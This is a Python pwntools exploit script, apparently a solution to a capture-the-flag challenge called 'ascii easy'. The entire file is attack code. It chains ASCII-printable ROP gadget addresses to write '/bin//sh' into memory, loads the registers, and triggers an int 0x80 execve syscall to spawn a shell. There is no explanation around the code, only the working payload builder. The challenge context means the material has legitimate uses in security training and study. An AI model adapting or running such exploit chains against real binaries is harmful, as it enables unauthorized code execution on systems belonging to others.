from pwn import *


class AsciiEasyExploit(object):

    READ_SIZE = 1295

    POP_EDX_GADGET = 0x555f3555
    MOV_TO_MEMORY_GADGET = 0x55687b3c
    POP_EBX_GADGET = 0x5557734e
    POP_ECX_GADGET = 0x556d2a51
    ADD_EAX_7_GADGET = 0x556a6e5b
    ADD_EAX_3_GADGET = 0x556a5060
    SUB_EAX_16_GADGET = 0x555f323b
    INT_80_GADGET = 0x55667176

    BIN_SH_ADDRESS = 0x55696121

    def __init__(self):
        self.exploit_payload = b""

    def write_dword_to_memory(self, address, dword):
        self.exploit_payload += p32(self.POP_EDX_GADGET)
        self.exploit_payload += p32(address)
        self.exploit_payload += dword
        self.exploit_payload += p32(self.MOV_TO_MEMORY_GADGET) + b"A" * 8

    def write_bin_sh_to_memory(self):
        self.write_dword_to_memory(self.BIN_SH_ADDRESS, b"/bin")
        self.write_dword_to_memory(self.BIN_SH_ADDRESS + 4, b"//sh")

    def set_registers(self):
        self.exploit_payload += p32(self.POP_EBX_GADGET) + p32(self.BIN_SH_ADDRESS)
        self.exploit_payload += p32(self.POP_EDX_GADGET) + p32(self.BIN_SH_ADDRESS + 8) + b"AAAA"
        self.exploit_payload += (p32(self.ADD_EAX_7_GADGET) + b"AAAA") * 2
        self.exploit_payload += p32(self.ADD_EAX_3_GADGET)
        self.exploit_payload += p32(self.SUB_EAX_16_GADGET) + b"AAAA"
        self.exploit_payload += p32(self.POP_ECX_GADGET) + p32(self.BIN_SH_ADDRESS + 8)

    def run_execve_syscall(self):
        self.exploit_payload += p32(self.INT_80_GADGET)

    def craft_exploit_payload(self):
        self.exploit_payload = b"A" * 32
        self.write_bin_sh_to_memory()
        self.set_registers()
        self.run_execve_syscall()

    def run(self):
        self.craft_exploit_payload()
        print(self.exploit_payload)


if __name__ == '__main__':
    AsciiEasyExploit().run()
